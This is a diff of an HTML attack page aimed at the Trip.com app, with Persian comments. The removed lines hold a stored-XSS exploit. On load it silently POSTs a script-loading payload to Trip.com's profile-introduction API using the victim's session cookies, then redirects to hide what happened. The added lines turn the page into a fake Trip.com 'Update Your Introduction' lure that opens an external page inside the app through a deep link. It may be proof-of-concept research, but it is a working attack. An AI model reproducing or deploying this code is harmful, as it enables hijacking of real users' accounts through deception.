@@ -1,51 +1,94 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Processing Offer...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trip.com - Update Your Introduction</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+        
+        body {
+            font-family: 'Roboto', system-ui, sans-serif;
+            background: linear-gradient(135deg, #0066cc, #00bfff);
+            color: white;
+            text-align: center;
+            padding: 40px 20px;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .card {
+            background: white;
+            color: #333;
+            border-radius: 16px;
+            padding: 40px 30px;
+            max-width: 420px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 12px;
+            color: #0066cc;
+        }
+        p {
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 35px;
+        }
+        button {
+            background: #0066cc;
+            color: white;
+            border: none;
+            padding: 18px 50px;
+            font-size: 18px;
+            font-weight: 500;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 6px 20px rgba(0,102,204,0.4);
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 12px 30px rgba(0,102,204,0.5);
+        }
+        .deeplink {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #888;
+            word-break: break-all;
+            padding: 12px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            text-align: left;
+        }
+    </style>
 </head>
 <body>
+    <div class="card">
+        <h1>Update Your Personal Introduction</h1>
+        <p>Click the button below to update your profile introduction on Trip.com.</p>
+        
+        <button onclick="triggerDeepLink()">
+            Update Introduction Now
+        </button>
+        
+        <div id="deeplink" class="deeplink"></div>
+    </div>
+
     <script>
-        // اسکریپتی که در پروفایل ذخیره می‌شود تا اسکریپت خارجی گیتهاب را اجرا کند
-        const xssPayload = `</script><img src=x onerror="var s=document.createElement('script');s.src='https://ferhadfaal.github.io/CV/trip/xss.js';document.body.appendChild(s);">`;
-
-        const targetUrl = "https://us.trip.com/restapi/soa2/18066/editUserIntroduction";
-
-        async function triggerPostRequest() {
-            // ساختار دیتای ارسالی مطابق تصویر Burp Suite تو
-            const payloadData = {
-                "content": xssPayload,
-                "head": {
-                    "cver": "1.0",
-                    "extension": [
-                        {"name": "locale", "value": "en-US"},
-                        {"name": "platform", "value": "Online"}
-                    ]
-                }
-            };
-
-            try {
-                // ارسال درخواست POST با بایپس Content-Type
-                // چون در WebView باز شده، کوکی‌های cticket به طور خودکار ارسال می‌شوند
-                await fetch(targetUrl, {
-                    method: "POST",
-                    mode: "no-cors", 
-                    headers: {
-                        "Content-Type": "text/plain"
-                    },
-                    body: JSON.stringify(payloadData)
-                });
-
-                // ریدایرکت نهایی برای مخفی ماندن حمله
-                window.location.href = "https://us.trip.com/hotels/istanbul/list";
-            } catch (e) {
-                // در صورت خطا هم به صفحه اصلی می‌رود
-                window.location.href = "https://us.trip.com/";
-            }
+        function triggerDeepLink() {
+            const targetPage = "https://ferhadfaal.github.io/CV/trip/npoc.html";
+            const deepLink = "ctripglobal://webview?url=" + encodeURIComponent(targetPage);
+            
+            // نمایش deep link برای تست (اختیاری)
+            document.getElementById("deeplink").textContent = deepLink;
+            
+            // باز کردن داخل اپ Trip.com
+            window.location.href = deepLink;
         }
-
-        // اجرای خودکار به محض لود شدن در WebView
-        window.onload = triggerPostRequest;
     </script>
-    <p style="text-align: center; margin-top: 50px;">Validating your account... Do not close the app.</p>
 </body>
 </html>
